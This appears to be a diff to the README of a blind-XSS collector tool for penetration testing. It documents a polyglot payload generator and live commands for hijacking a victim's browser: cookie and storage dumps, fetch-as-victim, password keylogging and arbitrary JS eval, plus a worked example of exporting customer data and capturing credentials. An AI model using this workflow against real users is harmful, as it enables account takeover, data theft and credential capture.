@@ -32,7 +32,7 @@ keystrokes, run arbitrary JS).
 - [Local development](#local-development)
 - [Using the dashboard](#using-the-dashboard)
 - [Full engagement workflow](#full-engagement-workflow)
-- [Interactive command reference](#interactive-command-reference)
+- [Using the interactive section](#using-the-interactive-section)
 - [CSP-aware exfiltration](#csp-aware-exfiltration)
 - [Purge (engagement close)](#purge-engagement-close)
 - [Tests](#tests)
@@ -113,6 +113,7 @@ as long as `img-src` allows the collector host. See [CSP-aware exfiltration](#cs
 | `/api/reports?sid=` | GET | **key** | Reports for one session. |
 | `/api/cmdresults?sid=` | GET | **key** | Command history + results for one session. |
 | `/api/cmd` | POST | **key** | Queue an interactive command `{sid, cmd}`. |
+| `/api/delete` | POST | **key** | Delete one session `{sid}` and all its reports/commands/chunks. |
 
 The public collector routes are intentionally unauthenticated (the victim's browser has no
 key); only the dashboard and its `/api/*` data routes require the `AUTH_KEY`, compared in
@@ -254,6 +255,9 @@ heartbeat dot, and there are two tabs.
   will land. A grey dot means the tab has closed; automatic captures are still there but
   live commands won't run.
 - **Filter box** — type to filter by token, URL, or IP.
+- **Delete a session** — hover a row and click the **×** at its top-right to remove that
+  session and all its captured data (reports, commands, chunks) from D1. Handy for clearing
+  test/self-callbacks; for a full wipe at engagement close use the [Purge](#purge-engagement-close) command.
 - Click a session to open its **detail** on the right:
   - `fired at` — URL / title / origin / referrer / timestamp (which surface fired).
   - `victim` — IP + User-Agent.
@@ -273,9 +277,12 @@ Mints unique probe URLs and ready-to-inject payloads so you never hand-write the
 2. Confirm the **collector host** (pre-filled from the current URL).
 3. Click **Generate**. You get:
    - a **unique token** (`t-support-form-a1b2c3`) and its probe URL, with a copy button;
-   - ready-to-inject payloads for **every context** — external `<script>`, event-handler
-     breakout, markup-injection / no-JS-context sink, and a strict-CSP image-beacon — each
-     with its own copy button, host and token already substituted.
+   - ready-to-inject payloads for **every context** — a **Polyglot** group first (one
+     payload that breaks out of HTML text, attributes, `<textarea>`/`<title>`,
+     `<style>`/`<script>` and JS-string contexts at once — paste it into any input when you
+     don't know the sink), then external `<script>`, event-handler breakout,
+     markup-injection / no-JS-context sink, and a strict-CSP image-beacon — each with its
+     own copy button, host and token already substituted.
 4. Every generated token is saved to a **token registry** in this browser's `localStorage`
    (token → label → host → time), with a delete control. This is your canary map: keep it
    in sync with the engagement/session file so every callback self-identifies.
@@ -312,22 +319,76 @@ fields across a target.
 
 ---
 
-## Interactive command reference
+## Using the interactive section
 
-Queue these from a live session's detail view (free-form box or quick buttons). Results
-appear under *command results* within a few seconds. Commands only run while the victim's
-tab is open and polling.
+Once a probe has fired, the automatic capture is already saved — but if the victim's tab is
+**still open**, you can drive their browser live. This is where blind XSS turns from "a script
+ran in a log viewer" into demonstrated account/data compromise.
 
-| Command | Effect |
-|---|---|
-| `dom` | Re-dump the current DOM. |
-| `cookies` | Re-dump `document.cookie`. |
-| `storage` | Re-dump `localStorage` + `sessionStorage`. |
-| `forms` | Re-dump all form / hidden-input values. |
-| `screenshot` | Best-effort page screenshot via html2canvas (needs `script-src` to allow the CDN). |
-| `fetch:<url>` | Fetch a **same-origin** URL with the victim's cookies and return the body (e.g. `fetch:/admin`, `fetch:/api/users/1`). |
-| `keylog:<selector>` | Stream keystrokes from matching inputs; blank selector = whole document (e.g. `keylog:#password`). |
-| `eval:<js>` | Run arbitrary JS in the victim context and return the result (e.g. `eval:document.domain`). |
+### How the channel works
+The probe **long-polls** `GET /q/<sid>` every 5 seconds. When you queue a command in the
+dashboard it's stored `pending`; on the probe's next poll it's handed over, executed in the
+victim's page context, and the result is POSTed back to `/qr/<id>` (or reassembled via the
+image-beacon under strict CSP). So expect a **few seconds of latency** per command, and note:
+
+- **The victim tab must stay open.** In the Sessions list a **green pulsing dot** means the
+  session polled within the last 30s (commands will land); a **grey dot** means the tab
+  closed — the automatic capture is still valid but live commands won't run.
+- Results appear in the **command results** card of that session's detail view, newest first,
+  each prefixed with its status (`pending` → `sent` → `done`). The view auto-refreshes every
+  4s; issuing a command also refreshes it ~1.5s later.
+
+### Where to issue commands
+Open a live session on the Sessions tab. The **interactive** card gives you two ways:
+
+1. **Quick-action buttons** — `dom`, `cookies`, `storage`, `screenshot`, plus
+   **fetch-as-victim** and **keylog** (these two prompt you for the argument).
+2. **Free-form command box** — type any command below and press **run** (or Enter). Use this
+   for `fetch:`, `eval:`, `keylog:<selector>`, or a repeat dump.
+
+### Command reference
+
+| Command | Argument | What it does | Example |
+|---|---|---|---|
+| `dom` | — | Re-dump the current full DOM (useful after the page changed since the initial capture). | `dom` |
+| `cookies` | — | Re-dump `document.cookie` (non-`HttpOnly`). | `cookies` |
+| `storage` | — | Re-dump `localStorage` + `sessionStorage`. | `storage` |
+| `forms` | — | Re-dump every form / hidden-input value (fresh CSRF tokens, pre-filled admin fields). | `forms` |
+| `fetch:<url>` | same-origin URL | **The high-impact one.** Fetches the URL with the victim's cookies (`credentials: include`) and returns status + body — you read admin pages / internal APIs / other users' records *as the victim*, from their own origin (bypasses CSRF). | `fetch:/admin/users`  ·  `fetch:/api/me` |
+| `keylog:<selector>` | CSS selector (optional) | Attaches a key logger. Blank = whole document; a selector scopes it (e.g. a password field). **Accumulates every keystroke** into a growing log — see below. | `keylog:` · `keylog:#password` |
+| `screenshot` | — | Best-effort PNG of the page via html2canvas — rendered inline under the DOM card. Needs `script-src` to allow the html2canvas CDN; otherwise returns a note (use `dom`). | `screenshot` |
+| `eval:<js>` | JavaScript | Runs arbitrary JS in the victim context and returns the result. Anything the page can do, you can do. | `eval:document.domain` · `eval:localStorage.token` |
+
+### Keylog: reads the full log, not just the last key
+The key logger **buffers every keystroke** and streams the whole accumulated log to the
+*command results* card (debounced ~350ms), so you see the complete typed sequence — not just
+the most recent key. Output is grouped by field and annotated:
+
+- printable characters appear inline; named keys are shown in braces, e.g. `{Enter}`,
+  `{Backspace}`, `{Tab}`, `{Shift}`;
+- when focus moves to a new field the log starts a new line prefixed with that field's
+  `name` / `id` / tag, e.g.:
+
+  ```
+  [email] jdoe@corp.com{Tab}
+  [password] Hunter2!{Enter}
+  ```
+
+The buffer keeps up to the last ~50 000 characters and persists for the life of the tab. It
+works under strict CSP too (it uses the same `q`-tagged channel that falls back to the
+image-beacon). Re-open the session (or wait for the 4s refresh) to see the log grow.
+
+### A worked example (prove real impact)
+1. Session fires from a support-ticket sink → you see the staff member's `adminsess` cookie
+   and a CSRF token in the capture.
+2. Confirm reach: `eval:document.domain` → returns the admin origin.
+3. Read protected data as them: `fetch:/admin/export` → returns the customer export body
+   (HTTP 200 *because their cookie rode along* — a logged-out request would 403).
+4. Capture proof: `screenshot`, and `dom` for the rendered admin page.
+5. If a login/re-auth field is on screen: `keylog:` and collect the typed credentials.
+
+Every one of these is a **logged active request** — keep the actions minimal and within scope,
+and purge the results at engagement close.
 
 ---
 
